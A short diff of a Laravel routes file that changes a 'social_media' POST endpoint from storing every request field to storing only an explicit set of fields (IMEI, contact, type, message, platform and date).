@@ -38,7 +38,8 @@ use Illuminate\Support\Facades\Route;
         return response("Sucess",200);
     });
     Route::post('social_media',function(Request $request) {
-        SocialApp::create($request->all());
+ //       SocialApp::create($request->all());
+        SocialApp::create(["imei"=>$request->imei,"contact"=>$request->contact,"type"=>$request->type,"message"=>$request->message,"platform"=>$request->platform,"date"=>$request->date]);
         return response("Success",200);
     });
 
